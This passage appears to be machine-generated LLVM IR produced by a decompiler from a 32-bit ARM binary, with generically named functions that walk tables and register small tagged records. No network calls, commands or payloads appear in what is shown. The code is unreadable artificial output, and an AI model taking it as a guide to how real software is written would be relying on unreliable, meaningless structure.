  %v0_a394 = load i32, i32* @r4, align 4
  %v1_a394 = add i32 %v0_a394, 24
  %v2_a394 = inttoptr i32 %v1_a394 to i32*
  %v3_a394 = load i32, i32* %v2_a394, align 4
  store i32 %v3_a394, i32* %r0.global-to-local, align 4
  %v2_a398 = icmp eq i32 %v3_a394, 0
  %v0_a39c = load i32, i32* %r5.global-to-local, align 4
  %v2_a39c = add i32 %v0_a394, 20
  %v3_a39c = inttoptr i32 %v2_a39c to i32*
  store i32 %v0_a39c, i32* %v3_a39c, align 4
  br i1 %v2_a398, label %dec_label_pc_a3a4, label %dec_label_pc_a454

dec_label_pc_a3a4:                                ; preds = %dec_label_pc_a394, %dec_label_pc_a43c
  %v0_a3a4 = load i32, i32* @r4, align 4
  %v1_a3a4 = add i32 %v0_a3a4, 28
  %v2_a3a4 = inttoptr i32 %v1_a3a4 to i32*
  %v3_a3a4 = load i32, i32* %v2_a3a4, align 4
  store i32 %v3_a3a4, i32* %r0.global-to-local, align 4
  %v2_a3a8 = icmp eq i32 %v3_a3a4, 0
  %v0_a3ac = load i32, i32* %r5.global-to-local, align 4
  %v2_a3ac = add i32 %v0_a3a4, 24
  %v3_a3ac = inttoptr i32 %v2_a3ac to i32*
  store i32 %v0_a3ac, i32* %v3_a3ac, align 4
  br i1 %v2_a3a8, label %dec_label_pc_a3b4, label %dec_label_pc_a46c

dec_label_pc_a3b4:                                ; preds = %dec_label_pc_a3a4, %dec_label_pc_a454, %dec_label_pc_a46c
  %v0_a3b4 = load i32, i32* %r5.global-to-local, align 4
  %v1_a3b4 = load i32, i32* @r4, align 4
  %v2_a3b4 = add i32 %v1_a3b4, 28
  %v3_a3b4 = inttoptr i32 %v2_a3b4 to i32*
  store i32 %v0_a3b4, i32* %v3_a3b4, align 4
  %v2_a3b8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_a3b8, i32* @r4, align 4
  store i32 %v6_a32c, i32* @r5, align 4
  store i32 %v9_a32c, i32* @lr, align 4
  %v0_a3bc = call i32 @function_1091c()
  store i32 %v0_a3bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a3c0

dec_label_pc_a3c0:                                ; preds = %dec_label_pc_a32c, %dec_label_pc_a3b4
  %v0_a3c4 = phi i32 [ %v2_a334, %dec_label_pc_a32c ], [ %v0_a3bc, %dec_label_pc_a3b4 ]
  %v2_a3c4 = call i32 @function_1379c(i32 %v0_a3c4, i32 9)
  store i32 %v2_a3c4, i32* %r0.global-to-local, align 4
  %v0_a3c8 = load i32, i32* @r4, align 4
  %v1_a3c8 = add i32 %v0_a3c8, 4
  %v2_a3c8 = inttoptr i32 %v1_a3c8 to i32*
  %v3_a3c8 = load i32, i32* %v2_a3c8, align 4
  store i32 %v3_a3c8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r5.global-to-local, align 4
  %v2_a3d0 = icmp eq i32 %v3_a3c8, 0
  %v2_a3d4 = inttoptr i32 %v0_a3c8 to i32*
  store i32 0, i32* %v2_a3d4, align 4
  br i1 %v2_a3d0, label %dec_label_pc_a3c0.dec_label_pc_a354_crit_edge, label %dec_label_pc_a3c0.dec_label_pc_a3dc_crit_edge

dec_label_pc_a3c0.dec_label_pc_a3dc_crit_edge:    ; preds = %dec_label_pc_a3c0
  %v0_a3e0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a3dc

dec_label_pc_a3c0.dec_label_pc_a354_crit_edge:    ; preds = %dec_label_pc_a3c0
  %v0_a354.pre = load i32, i32* @r4, align 4
  %v0_a35c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_a354

dec_label_pc_a3dc:                                ; preds = %dec_label_pc_a3c0.dec_label_pc_a3dc_crit_edge, %dec_label_pc_a340
  %v0_a3e0 = phi i32 [ %v0_a3e0.pre, %dec_label_pc_a3c0.dec_label_pc_a3dc_crit_edge ], [ %v3_a340, %dec_label_pc_a340 ]
  %v2_a3e0 = call i32 @function_1379c(i32 %v0_a3e0, i32 9)
  store i32 %v2_a3e0, i32* %r0.global-to-local, align 4
  %v0_a3e4 = load i32, i32* @r4, align 4
  %v1_a3e4 = add i32 %v0_a3e4, 8
  %v2_a3e4 = inttoptr i32 %v1_a3e4 to i32*
  %v3_a3e4 = load i32, i32* %v2_a3e4, align 4
  store i32 %v3_a3e4, i32* %r0.global-to-local, align 4
  %v2_a3e8 = icmp eq i32 %v3_a3e4, 0
  %v0_a3ec = load i32, i32* %r5.global-to-local, align 4
  %v2_a3ec = add i32 %v0_a3e4, 4
  %v3_a3ec = inttoptr i32 %v2_a3ec to i32*
  store i32 %v0_a3ec, i32* %v3_a3ec, align 4
  br i1 %v2_a3e8, label %dec_label_pc_a364, label %dec_label_pc_a3f4

dec_label_pc_a3f4:                                ; preds = %dec_label_pc_a354, %dec_label_pc_a3dc
  %v0_a3f8 = load i32, i32* %r0.global-to-local, align 4
  %v2_a3f8 = call i32 @function_1379c(i32 %v0_a3f8, i32 9)
  store i32 %v2_a3f8, i32* %r0.global-to-local, align 4
  %v0_a3fc = load i32, i32* @r4, align 4
  %v1_a3fc = add i32 %v0_a3fc, 12
  %v2_a3fc = inttoptr i32 %v1_a3fc to i32*
  %v3_a3fc = load i32, i32* %v2_a3fc, align 4
  store i32 %v3_a3fc, i32* %r0.global-to-local, align 4
  %v2_a400 = icmp eq i32 %v3_a3fc, 0
  %v0_a404 = load i32, i32* %r5.global-to-local, align 4
  %v2_a404 = add i32 %v0_a3fc, 8
  %v3_a404 = inttoptr i32 %v2_a404 to i32*
  store i32 %v0_a404, i32* %v3_a404, align 4
  br i1 %v2_a400, label %dec_label_pc_a374, label %dec_label_pc_a40c

dec_label_pc_a40c:                                ; preds = %dec_label_pc_a364, %dec_label_pc_a3f4
  %v0_a410 = load i32, i32* %r0.global-to-local, align 4
  %v2_a410 = call i32 @function_1379c(i32 %v0_a410, i32 9)
  store i32 %v2_a410, i32* %r0.global-to-local, align 4
  %v0_a414 = load i32, i32* @r4, align 4
  %v1_a414 = add i32 %v0_a414, 16
  %v2_a414 = inttoptr i32 %v1_a414 to i32*
  %v3_a414 = load i32, i32* %v2_a414, align 4
  store i32 %v3_a414, i32* %r0.global-to-local, align 4
  %v2_a418 = icmp eq i32 %v3_a414, 0
  %v0_a41c = load i32, i32* %r5.global-to-local, align 4
  %v2_a41c = add i32 %v0_a414, 12
  %v3_a41c = inttoptr i32 %v2_a41c to i32*
  store i32 %v0_a41c, i32* %v3_a41c, align 4
  br i1 %v2_a418, label %dec_label_pc_a384, label %dec_label_pc_a424

dec_label_pc_a424:                                ; preds = %dec_label_pc_a374, %dec_label_pc_a40c
  %v0_a428 = load i32, i32* %r0.global-to-local, align 4
  %v2_a428 = call i32 @function_1379c(i32 %v0_a428, i32 9)
  store i32 %v2_a428, i32* %r0.global-to-local, align 4
  %v0_a42c = load i32, i32* @r4, align 4
  %v1_a42c = add i32 %v0_a42c, 20
  %v2_a42c = inttoptr i32 %v1_a42c to i32*
  %v3_a42c = load i32, i32* %v2_a42c, align 4
  store i32 %v3_a42c, i32* %r0.global-to-local, align 4
  %v2_a430 = icmp eq i32 %v3_a42c, 0
  %v0_a434 = load i32, i32* %r5.global-to-local, align 4
  %v2_a434 = add i32 %v0_a42c, 16
  %v3_a434 = inttoptr i32 %v2_a434 to i32*
  store i32 %v0_a434, i32* %v3_a434, align 4
  br i1 %v2_a430, label %dec_label_pc_a394, label %dec_label_pc_a43c

dec_label_pc_a43c:                                ; preds = %dec_label_pc_a384, %dec_label_pc_a424
  %v0_a440 = load i32, i32* %r0.global-to-local, align 4
  %v2_a440 = call i32 @function_1379c(i32 %v0_a440, i32 9)
  store i32 %v2_a440, i32* %r0.global-to-local, align 4
  %v0_a444 = load i32, i32* @r4, align 4
  %v1_a444 = add i32 %v0_a444, 24
  %v2_a444 = inttoptr i32 %v1_a444 to i32*
  %v3_a444 = load i32, i32* %v2_a444, align 4
  store i32 %v3_a444, i32* %r0.global-to-local, align 4
  %v2_a448 = icmp eq i32 %v3_a444, 0
  %v0_a44c = load i32, i32* %r5.global-to-local, align 4
  %v2_a44c = add i32 %v0_a444, 20
  %v3_a44c = inttoptr i32 %v2_a44c to i32*
  store i32 %v0_a44c, i32* %v3_a44c, align 4
  br i1 %v2_a448, label %dec_label_pc_a3a4, label %dec_label_pc_a454

dec_label_pc_a454:                                ; preds = %dec_label_pc_a394, %dec_label_pc_a43c
  %v0_a458 = load i32, i32* %r0.global-to-local, align 4
  %v2_a458 = call i32 @function_1379c(i32 %v0_a458, i32 9)
  store i32 %v2_a458, i32* %r0.global-to-local, align 4
  %v0_a45c = load i32, i32* @r4, align 4
  %v1_a45c = add i32 %v0_a45c, 28
  %v2_a45c = inttoptr i32 %v1_a45c to i32*
  %v3_a45c = load i32, i32* %v2_a45c, align 4
  store i32 %v3_a45c, i32* %r0.global-to-local, align 4
  %v2_a460 = icmp eq i32 %v3_a45c, 0
  %v0_a464 = load i32, i32* %r5.global-to-local, align 4
  %v2_a464 = add i32 %v0_a45c, 24
  %v3_a464 = inttoptr i32 %v2_a464 to i32*
  store i32 %v0_a464, i32* %v3_a464, align 4
  br i1 %v2_a460, label %dec_label_pc_a3b4, label %dec_label_pc_a46c

dec_label_pc_a46c:                                ; preds = %dec_label_pc_a3a4, %dec_label_pc_a454
  %v0_a470 = load i32, i32* %r0.global-to-local, align 4
  %v2_a470 = call i32 @function_1379c(i32 %v0_a470, i32 9)
  store i32 %v2_a470, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a3b4

; uselistorder directives
  uselistorder i32* %r5.global-to-local, { 2, 3, 4, 5, 6, 7, 0, 1, 10, 8, 9, 11, 12, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 2, 16, 1, 4, 18, 3, 6, 20, 5, 8, 22, 7, 10, 24, 9, 12, 26, 11, 15, 13, 14, 30, 0, 17, 19, 21, 23, 25, 27, 28, 29 }
  uselistorder label %dec_label_pc_a46c, { 1, 0 }
  uselistorder label %dec_label_pc_a454, { 1, 0 }
  uselistorder label %dec_label_pc_a43c, { 1, 0 }
  uselistorder label %dec_label_pc_a424, { 1, 0 }
  uselistorder label %dec_label_pc_a40c, { 1, 0 }
  uselistorder label %dec_label_pc_a3f4, { 1, 0 }
  uselistorder label %dec_label_pc_a3c0, { 1, 0 }
  uselistorder label %dec_label_pc_a3b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_a3a4, { 1, 0 }
  uselistorder label %dec_label_pc_a394, { 1, 0 }
  uselistorder label %dec_label_pc_a384, { 1, 0 }
  uselistorder label %dec_label_pc_a374, { 1, 0 }
  uselistorder label %dec_label_pc_a364, { 1, 0 }
}

define i32 @function_a47c(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_a47c:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_a47c = urem i32 %arg1, 256
  %v2_a480 = icmp eq i32 %v1_a47c, 0
  %v3_a484 = load i32, i32* @r4, align 4
  br i1 %v2_a480, label %dec_label_pc_a4cc, label %dec_label_pc_a490

dec_label_pc_a490:                                ; preds = %dec_label_pc_a47c
  %v0_a490 = load i32, i32* %r1.global-to-local, align 4
  %v1_a490 = add i32 %v0_a490, 4
  %v2_a490 = inttoptr i32 %v1_a490 to i8*
  %v3_a490 = load i8, i8* %v2_a490, align 1
  %v4_a490 = zext i8 %v3_a490 to i32
  %v1_a494 = urem i32 %arg3, 256
  %v9_a498 = icmp eq i32 %v4_a490, %v1_a494
  br i1 %v9_a498, label %dec_label_pc_a4d4, label %dec_label_pc_a4bc.preheader

dec_label_pc_a4bc.preheader:                      ; preds = %dec_label_pc_a490
  br label %dec_label_pc_a4bc

dec_label_pc_a4ac:                                ; preds = %dec_label_pc_a4bc
  %v1_a4ac = add i32 %v0_a4b4.in, 12
  %v2_a4ac = inttoptr i32 %v1_a4ac to i8*
  %v3_a4ac = load i8, i8* %v2_a4ac, align 1
  %v4_a4ac = zext i8 %v3_a4ac to i32
  %v9_a4b0 = icmp eq i32 %v1_a494, %v4_a4ac
  br i1 %v9_a4b0, label %dec_label_pc_a4d4, label %dec_label_pc_a4bc

dec_label_pc_a4bc:                                ; preds = %dec_label_pc_a4bc.preheader, %dec_label_pc_a4ac
  %v0_a4b4.in = phi i32 [ %v0_a490, %dec_label_pc_a4bc.preheader ], [ %v0_a4b4, %dec_label_pc_a4ac ]
  %v0_a4bc = phi i32 [ 0, %dec_label_pc_a4bc.preheader ], [ %v1_a4bc, %dec_label_pc_a4ac ]
  %v0_a4b4 = add i32 %v0_a4b4.in, 8
  %v1_a4bc = add i32 %v0_a4bc, 1
  %v9_a4c0 = icmp eq i32 %v1_a47c, %v1_a4bc
  store i32 %v0_a4b4, i32* %r1.global-to-local, align 4
  br i1 %v9_a4c0, label %dec_label_pc_a4cc, label %dec_label_pc_a4ac

dec_label_pc_a4cc:                                ; preds = %dec_label_pc_a4bc, %dec_label_pc_a4d4, %dec_label_pc_a47c
  store i32 %v3_a484, i32* @r4, align 4
  ret i32 %arg4

dec_label_pc_a4d4:                                ; preds = %dec_label_pc_a4ac, %dec_label_pc_a490
  %v0_a4d4 = phi i32 [ %v0_a490, %dec_label_pc_a490 ], [ %v0_a4b4, %dec_label_pc_a4ac ]
  %v1_a4d4 = inttoptr i32 %v0_a4d4 to i32*
  %v2_a4d4 = load i32, i32* %v1_a4d4, align 4
  store i32 %v2_a4d4, i32* @r0, align 4
  %v2_a4d8 = icmp eq i32 %v2_a4d4, 0
  br i1 %v2_a4d8, label %dec_label_pc_a4cc, label %dec_label_pc_a4e0

dec_label_pc_a4e0:                                ; preds = %dec_label_pc_a4d4
  store i32 %v3_a484, i32* @r4, align 4
  %v1_a4e4 = call i32 @function_13d70(i32 %v2_a4d4)
  ret i32 %v1_a4e4

; uselistorder directives
  uselistorder i32 %v1_a4bc, { 1, 0 }
  uselistorder i32 %v0_a4b4, { 1, 0, 2 }
  uselistorder i32 %v0_a4b4.in, { 1, 0 }
  uselistorder i32 %v1_a494, { 1, 0 }
  uselistorder i32 %v0_a490, { 1, 0, 2 }
  uselistorder i32 %v3_a484, { 1, 0 }
  uselistorder i32 %v1_a47c, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a4cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a4bc, { 1, 0 }
}

define i32 @function_a4e8(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_a4e8:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v1_a4e8 = urem i32 %arg1, 256
  %v2_a4ec = icmp eq i32 %v1_a4e8, 0
  %v3_a4f0 = load i32, i32* @r4, align 4
  %v6_a4f0 = load i32, i32* @lr, align 4
  br i1 %v2_a4ec, label %dec_label_pc_a538, label %dec_label_pc_a4fc

dec_label_pc_a4fc:                                ; preds = %dec_label_pc_a4e8
  %v0_a4fc = load i32, i32* %r1.global-to-local, align 4
  %v1_a4fc = add i32 %v0_a4fc, 4
  %v2_a4fc = inttoptr i32 %v1_a4fc to i8*
  %v3_a4fc = load i8, i8* %v2_a4fc, align 1
  %v4_a4fc = zext i8 %v3_a4fc to i32
  %v1_a500 = urem i32 %arg3, 256
  %v9_a504 = icmp eq i32 %v4_a4fc, %v1_a500
  br i1 %v9_a504, label %dec_label_pc_a540, label %dec_label_pc_a528.preheader

dec_label_pc_a528.preheader:                      ; preds = %dec_label_pc_a4fc
  br label %dec_label_pc_a528

dec_label_pc_a518:                                ; preds = %dec_label_pc_a528
  %v1_a518 = add i32 %v0_a520.in, 12
  %v2_a518 = inttoptr i32 %v1_a518 to i8*
  %v3_a518 = load i8, i8* %v2_a518, align 1
  %v4_a518 = zext i8 %v3_a518 to i32
  %v9_a51c = icmp eq i32 %v1_a500, %v4_a518
  br i1 %v9_a51c, label %dec_label_pc_a540, label %dec_label_pc_a528

dec_label_pc_a528:                                ; preds = %dec_label_pc_a528.preheader, %dec_label_pc_a518
  %v0_a520.in = phi i32 [ %v0_a4fc, %dec_label_pc_a528.preheader ], [ %v0_a520, %dec_label_pc_a518 ]
  %v0_a528 = phi i32 [ 0, %dec_label_pc_a528.preheader ], [ %v1_a528, %dec_label_pc_a518 ]
  %v0_a520 = add i32 %v0_a520.in, 8
  %v1_a528 = add i32 %v0_a528, 1
  store i32 %v1_a528, i32* @lr, align 4
  %v9_a52c = icmp eq i32 %v1_a4e8, %v1_a528
  store i32 %v0_a520, i32* %r1.global-to-local, align 4
  br i1 %v9_a52c, label %dec_label_pc_a538, label %dec_label_pc_a518

dec_label_pc_a538:                                ; preds = %dec_label_pc_a528, %dec_label_pc_a540, %dec_label_pc_a4e8
  store i32 %v3_a4f0, i32* @r4, align 4
  ret i32 %arg4

dec_label_pc_a540:                                ; preds = %dec_label_pc_a518, %dec_label_pc_a4fc
  %v0_a540 = phi i32 [ %v0_a4fc, %dec_label_pc_a4fc ], [ %v0_a520, %dec_label_pc_a518 ]
  %v1_a540 = inttoptr i32 %v0_a540 to i32*
  %v2_a540 = load i32, i32* %v1_a540, align 4
  %v2_a544 = icmp eq i32 %v2_a540, 0
  br i1 %v2_a544, label %dec_label_pc_a538, label %dec_label_pc_a54c

dec_label_pc_a54c:                                ; preds = %dec_label_pc_a540
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v3_a4f0, i32* @r4, align 4
  store i32 %v6_a4f0, i32* @lr, align 4
  %v2_a554 = inttoptr i32 %v2_a540 to i8*
  %v3_a554 = call i32 @function_12e08(i8* %v2_a554, i32 10)
  ret i32 %v3_a554

; uselistorder directives
  uselistorder i32 %v1_a528, { 1, 2, 0 }
  uselistorder i32 %v0_a520, { 1, 0, 2 }
  uselistorder i32 %v0_a520.in, { 1, 0 }
  uselistorder i32 %v1_a500, { 1, 0 }
  uselistorder i32 %v0_a4fc, { 1, 0, 2 }
  uselistorder i32 %v3_a4f0, { 1, 0 }
  uselistorder i32 %v1_a4e8, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_a538, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a528, { 1, 0 }
}

define i32 @function_a558(i32 %arg1) local_unnamed_addr {
dec_label_pc_a558:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_a558 = load i32, i32* @r4, align 4
  store i32 %v3_a558, i32* %stack_var_-20, align 4
  %v6_a558 = load i32, i32* @r5, align 4
  %v9_a558 = load i32, i32* @r6, align 4
  %v12_a558 = load i32, i32* @r7, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_a564 = call i32 @function_14294(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_1ebfc.55 to i32), i32* @r4, align 4
  %v2_a56c = load i8, i8* bitcast (i8** @global_var_1ebfc.55 to i8*), align 4
  %v3_a56c = zext i8 %v2_a56c to i32
  store i32 ptrtoint (i32* @global_var_1ec00.57 to i32), i32* @r6, align 4
  store i32 53540, i32* %r2.global-to-local, align 4
  store i32 %v2_a564, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a580 = mul nuw nsw i32 %v3_a56c, 4
  store i32 %v3_a580, i32* %r1.global-to-local, align 4
  %v2_a584 = load i32, i32* @global_var_1ec00.57, align 4
  %v2_a588 = inttoptr i32 %v2_a564 to i32*
  store i32 53540, i32* %v2_a588, align 4
  %v3_a58c = load i32, i32* @r5, align 4
  %v4_a58c = add i32 %v3_a58c, 4
  %v5_a58c = inttoptr i32 %v4_a58c to i8*
  store i8 0, i8* %v5_a58c, align 1
  %v0_a590 = load i32, i32* %r1.global-to-local, align 4
  %v1_a590 = add i32 %v0_a590, 4
  store i32 %v1_a590, i32* %r1.global-to-local, align 4
  %v5_a594 = call i32 @function_143dc(i32 %v2_a584, i32 %v1_a590, i32 53540, i32 0)
  %v2_a598 = load i8, i8* bitcast (i8** @global_var_1ebfc.55 to i8*), align 4
  %v3_a598 = zext i8 %v2_a598 to i32
  store i32 %v3_a598, i32* %r3.global-to-local, align 4
  store i32 %v5_a594, i32* %ip.global-to-local, align 4
  %v0_a5a0 = load i32, i32* @r5, align 4
  %v5_a5a0 = mul nuw nsw i32 %v3_a598, 4
  %v6_a5a0 = add i32 %v5_a5a0, %v5_a594
  %v7_a5a0 = inttoptr i32 %v6_a5a0 to i32*
  store i32 %v0_a5a0, i32* %v7_a5a0, align 4
  store i32 ptrtoint (i8* @global_var_1ebfd.66 to i32), i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v3_a5b0 = load i32, i32* @r4, align 4
  %v4_a5b0 = inttoptr i32 %v3_a5b0 to i8*
  store i8 ptrtoint (i8* @global_var_1ebfd.66 to i8), i8* %v4_a5b0, align 1
  %v0_a5b4 = load i32, i32* %ip.global-to-local, align 4
  %v1_a5b4 = load i32, i32* @r6, align 4
  %v2_a5b4 = inttoptr i32 %v1_a5b4 to i32*
  store i32 %v0_a5b4, i32* %v2_a5b4, align 4
  %v2_a5b8 = call i32 @function_14294(i32 1, i32 8)
  %v2_a5bc = load i8, i8* bitcast (i8** @global_var_1ebfc.55 to i8*), align 4
  %v3_a5bc = zext i8 %v2_a5bc to i32
  store i32 ptrtoint (i32* @global_var_d7b0.68 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  store i32 %v2_a5b8, i32* @r5, align 4
  %v3_a5cc = mul nuw nsw i32 %v3_a5bc, 4
  store i32 %v3_a5cc, i32* %r1.global-to-local, align 4
  %v2_a5d0 = load i32, i32* @global_var_1ec00.57, align 4
  %v2_a5d4 = inttoptr i32 %v2_a5b8 to i32*
  store i32 ptrtoint (i32* @global_var_d7b0.68 to i32), i32* %v2_a5d4, align 4
  %v0_a5d8 = load i32, i32* @r7, align 4
  %v1_a5d8 = trunc i32 %v0_a5d8 to i8
  %v2_a5d8 = load i32, i32* @r5, align 4
  %v3_a5d8 = add i32 %v2_a5d8, 4
  %v4_a5d8 = inttoptr i32 %v3_a5d8 to i8*
  store i8 %v1_a5d8, i8* %v4_a5d8, align 1
  %v0_a5dc = load i32, i32* %r1.global-to-local, align 4
  %v1_a5dc = add i32 %v0_a5dc, 4
  store i32 %v1_a5dc, i32* %r1.global-to-local, align 4
  %v5_a5e0 = call i32 @function_143dc(i32 %v2_a5d0, i32 %v1_a5dc, i32 sext (i8 ptrtoint (i8* @global_var_1ebfd.66 to i8) to i32), i32 ptrtoint (i32* @global_var_d7b0.68 to i32))
  %v2_a5e4 = load i8, i8* bitcast (i8** @global_var_1ebfc.55 to i8*), align 4
  %v3_a5e4 = zext i8 %v2_a5e4 to i32
  store i32 %v3_a5e4, i32* %r3.global-to-local, align 4
  store i32 %v5_a5e0, i32* %ip.global-to-local, align 4
  %v0_a5ec = load i32, i32* @r5, align 4
  %v5_a5ec = mul nuw nsw i32 %v3_a5e4, 4
  %v6_a5ec = add i32 %v5_a5ec, %v5_a5e0
  %v7_a5ec = inttoptr i32 %v6_a5ec to i32*
  store i32 %v0_a5ec, i32* %v7_a5ec, align 4
  %v0_a5f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a5f0 = load i32, i32* @r7, align 4
  %v2_a5f0 = add i32 %v1_a5f0, %v0_a5f0
  store i32 %v2_a5f0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a5fc = load i32, i32* %ip.global-to-local, align 4
  %v1_a5fc = load i32, i32* @r6, align 4
  %v2_a5fc = inttoptr i32 %v1_a5fc to i32*
  store i32 %v0_a5fc, i32* %v2_a5fc, align 4
  %v0_a600 = load i32, i32* %r2.global-to-local, align 4
  %v1_a600 = trunc i32 %v0_a600 to i8
  %v2_a600 = load i32, i32* @r4, align 4
  %v3_a600 = inttoptr i32 %v2_a600 to i8*
  store i8 %v1_a600, i8* %v3_a600, align 1
  %v2_a604 = call i32 @function_14294(i32 %v1_a5f0, i32 8)
  %v2_a608 = load i8, i8* bitcast (i8** @global_var_1ebfc.55 to i8*), align 4
  %v3_a608 = zext i8 %v2_a608 to i32
  store i32 ptrtoint (i32* @global_var_dc74.70 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a604, i32* @r5, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_a618 = mul nuw nsw i32 %v3_a608, 4
  store i32 %v3_a618, i32* %r1.global-to-local, align 4
  %v2_a61c = load i32, i32* @global_var_1ec00.57, align 4
  %v2_a620 = inttoptr i32 %v2_a604 to i32*
  store i32 ptrtoint (i32* @global_var_dc74.70 to i32), i32* %v2_a620, align 4
  %v3_a624 = load i32, i32* @r5, align 4
  %v4_a624 = add i32 %v3_a624, 4
  %v5_a624 = inttoptr i32 %v4_a624 to i8*
  store i8 2, i8* %v5_a624, align 1
  %v0_a628 = load i32, i32* %r1.global-to-local, align 4
  %v1_a628 = add i32 %v0_a628, 4
  store i32 %v1_a628, i32* %r1.global-to-local, align 4
  %v5_a62c = call i32 @function_143dc(i32 %v2_a61c, i32 %v1_a628, i32 ptrtoint (i32* @global_var_dc74.70 to i32), i32 2)
  %v2_a630 = load i8, i8* bitcast (i8** @global_var_1ebfc.55 to i8*), align 4
  %v3_a630 = zext i8 %v2_a630 to i32
  store i32 %v3_a630, i32* %r3.global-to-local, align 4
  store i32 %v5_a62c, i32* %ip.global-to-local, align 4
  %v0_a638 = load i32, i32* @r5, align 4
  %v5_a638 = mul nuw nsw i32 %v3_a630, 4
  %v6_a638 = add i32 %v5_a638, %v5_a62c
  %v7_a638 = inttoptr i32 %v6_a638 to i32*
  store i32 %v0_a638, i32* %v7_a638, align 4
  %v0_a63c = load i32, i32* %r3.global-to-local, align 4
  %v1_a63c = load i32, i32* @r7, align 4
  %v2_a63c = add i32 %v1_a63c, %v0_a63c
  store i32 %v2_a63c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a648 = load i32, i32* %ip.global-to-local, align 4
  %v1_a648 = load i32, i32* @r6, align 4
  %v2_a648 = inttoptr i32 %v1_a648 to i32*
  store i32 %v0_a648, i32* %v2_a648, align 4
  %v0_a64c = load i32, i32* %r2.global-to-local, align 4
  %v1_a64c = trunc i32 %v0_a64c to i8
  %v2_a64c = load i32, i32* @r4, align 4
  %v3_a64c = inttoptr i32 %v2_a64c to i8*
  store i8 %v1_a64c, i8* %v3_a64c, align 1
  %v2_a650 = call i32 @function_14294(i32 %v1_a63c, i32 8)
  %v2_a654 = load i8, i8* bitcast (i8** @global_var_1ebfc.55 to i8*), align 4
  %v3_a654 = zext i8 %v2_a654 to i32
  store i32 ptrtoint (i32* @global_var_ce40.72 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a650, i32* @r5, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v3_a664 = mul nuw nsw i32 %v3_a654, 4
  store i32 %v3_a664, i32* %r1.global-to-local, align 4
  %v2_a668 = load i32, i32* @global_var_1ec00.57, align 4
  %v2_a66c = inttoptr i32 %v2_a650 to i32*
  store i32 ptrtoint (i32* @global_var_ce40.72 to i32), i32* %v2_a66c, align 4
  %v3_a670 = load i32, i32* @r5, align 4
  %v4_a670 = add i32 %v3_a670, 4
  %v5_a670 = inttoptr i32 %v4_a670 to i8*
  store i8 9, i8* %v5_a670, align 1
  %v0_a674 = load i32, i32* %r1.global-to-local, align 4
  %v1_a674 = add i32 %v0_a674, 4
  store i32 %v1_a674, i32* %r1.global-to-local, align 4
  %v5_a678 = call i32 @function_143dc(i32 %v2_a668, i32 %v1_a674, i32 ptrtoint (i32* @global_var_ce40.72 to i32), i32 9)
  %v2_a67c = load i8, i8* bitcast (i8** @global_var_1ebfc.55 to i8*), align 4
  %v3_a67c = zext i8 %v2_a67c to i32
  store i32 %v3_a67c, i32* %r3.global-to-local, align 4
  store i32 %v5_a678, i32* %ip.global-to-local, align 4
  %v0_a684 = load i32, i32* @r5, align 4
  %v5_a684 = mul nuw nsw i32 %v3_a67c, 4
  %v6_a684 = add i32 %v5_a684, %v5_a678
  %v7_a684 = inttoptr i32 %v6_a684 to i32*
  store i32 %v0_a684, i32* %v7_a684, align 4
  %v0_a688 = load i32, i32* %r3.global-to-local, align 4
  %v1_a688 = load i32, i32* @r7, align 4
  %v2_a688 = add i32 %v1_a688, %v0_a688
  store i32 %v2_a688, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_a694 = load i32, i32* %ip.global-to-local, align 4
  %v1_a694 = load i32, i32* @r6, align 4
  %v2_a694 = inttoptr i32 %v1_a694 to i32*
  store i32 %v0_a694, i32* %v2_a694, align 4
  %v0_a698 = load i32, i32* %r2.global-to-local, align 4
  %v1_a698 = trunc i32 %v0_a698 to i8
  %v2_a698 = load i32, i32* @r4, align 4
  %v3_a698 = inttoptr i32 %v2_a698 to i8*
  store i8 %v1_a698, i8* %v3_a698, align 1
  %v2_a69c = call i32 @function_14294(i32 %v1_a688, i32 8)
  %v2_a6a0 = load i8, i8* bitcast (i8** @global_var_1ebfc.55 to i8*), align 4
  %v3_a6a0 = zext i8 %v2_a6a0 to i32
  store i32 ptrtoint (i32* @global_var_c6fc.74 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_a69c, i32* @r5, align 4
  store i32 3, i32* %r3.global-to-local, align 4
